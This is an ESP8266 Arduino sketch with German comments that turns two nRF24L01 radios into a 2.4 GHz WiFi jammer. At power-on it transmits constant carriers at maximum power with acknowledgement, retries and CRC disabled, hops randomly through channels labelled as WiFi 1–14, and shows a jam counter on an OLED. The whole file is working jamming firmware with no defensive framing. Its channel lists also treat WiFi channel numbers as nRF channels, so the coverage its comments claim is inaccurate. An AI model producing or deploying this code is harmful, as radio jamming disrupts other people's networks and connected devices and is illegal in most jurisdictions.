// Inkludierte Bibliotheken
#include <SPI.h>
#include <Wire.h>
#include "RF24.h"
#include <Adafruit_GFX.h>
#include <Adafruit_SH110X.h>
#include <ESP8266WiFi.h>

// --- FINALE PIN-KONFIGURATION ---
#define OLED_SDA D2
#define OLED_SCL D1
#define I2C_ADDRESS 0x3C

#define NRF1_CE_PIN   D8
#define NRF1_CSN_PIN  D4
#define NRF2_CE_PIN   D0
#define NRF2_CSN_PIN  1 // GPIO1, TX

// --- OBJEKTE ---
Adafruit_SH1106G display = Adafruit_SH1106G(128, 64, &Wire, -1);
RF24 radio1(NRF1_CE_PIN, NRF1_CSN_PIN);
RF24 radio2(NRF2_CE_PIN, NRF2_CSN_PIN);

// --- ZUSTÄNDE für das Display ---
int lastJammedChannel_1 = 0; // Separate channel tracking for each radio
int lastJammedChannel_2 = 0;
String lastJammedType = "WiFi";
unsigned long jamCount = 0;
unsigned long lastUpdate = 0;

// ===================================================================
// NEU: KANAL-LISTEN FÜR WIFI (aus V2 config.h)
// ===================================================================
// Aufgeteilt für eine effektivere Abdeckung mit zwei Radios.
const byte wifi_channels_low[]  = {1, 2, 3, 4, 5, 6};      // Für Radio 1
const byte wifi_channels_high[] = {7, 8, 9, 10, 11, 12, 13, 14}; // Für Radio 2


// ===================================================================
// SETUP (V2 Logik)
// ===================================================================
void setup() {
    // Radikale Deaktivierung des ESP-Radios, um Störungen zu verhindern
    WiFi.mode(WIFI_OFF);
    WiFi.forceSleepBegin();
    delay(1);

    // Initialisierung von Display und SPI-Bus
    display.begin(I2C_ADDRESS, true);
    display.setRotation(2);
    display.clearDisplay();
    SPI.begin();

    // Radios initialisieren und Dauersignal starten
    if (radio1.begin()) {
        configureNrf(radio1);
        radio1.startConstCarrier(RF24_PA_MAX, wifi_channels_low[0]); // Starte im unteren Band
    }
    if (radio2.begin()) {
        configureNrf(radio2);
        radio2.startConstCarrier(RF24_PA_MAX, wifi_channels_high[0]); // Starte im oberen Band
    }
}

// ===================================================================
// LOOP (startet WiFi-Jamming sofort)
// ===================================================================
void loop() {
    jamWiFi();
    updateDisplay();
}

// ===================================================================
// FUNKTIONEN
// ===================================================================

// Konfiguriert ein NRF-Modul für maximalen Störeffekt (aus V2)
void configureNrf(RF24 &radio) {
    radio.setAutoAck(false);
    radio.stopListening();
    radio.setRetries(0, 0);
    radio.setPALevel(RF24_PA_MAX, true);
    radio.setDataRate(RF24_2MBPS);
    radio.setCRCLength(RF24_CRC_DISABLED);
}

// NEU: WiFi-Jamming-Funktion, die die V2-Logik mit zwei Radios umsetzt
void jamWiFi() {
    // Radio 1 springt zufällig durch die unteren WiFi-Kanäle
    byte channel1 = wifi_channels_low[random(0, sizeof(wifi_channels_low))];
    radio1.setChannel(channel1);
    lastJammedChannel_1 = channel1;

    // Radio 2 springt zufällig durch die oberen WiFi-Kanäle
    byte channel2 = wifi_channels_high[random(0, sizeof(wifi_channels_high))];
    radio2.setChannel(channel2);
    lastJammedChannel_2 = channel2;
    
    jamCount++;
    
    delayMicroseconds(100); // Kurze Pause für Stabilität
}

// Angepasste Display-Funktion, um beide Kanäle anzuzeigen
void updateDisplay() {
    if (millis() - lastUpdate < 250) return;
    lastUpdate = millis();

    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(SH110X_WHITE);

    display.setCursor(0, 0); display.println("MODE: JAMMING WIFI");
    display.drawLine(0, 10, 128, 10, SH110X_WHITE);
    display.setCursor(0, 15); display.print("TYPE:   "); display.println(lastJammedType);
    display.setCursor(0, 25); display.print("CHAN 1: "); display.println(lastJammedChannel_1);
    display.setCursor(0, 35); display.print("CHAN 2: "); display.println(lastJammedChannel_2);
    display.setCursor(0, 45); display.print("COUNT:  "); display.println(jamCount);
    
    // Animierte Signalbalken
    for (int i = 0; i < (jamCount % 5) + 1; i++) {
        display.fillRect(i * 5, 64 - i * 3, 4, i * 3, SH110X_WHITE);
    }

    display.display();
}
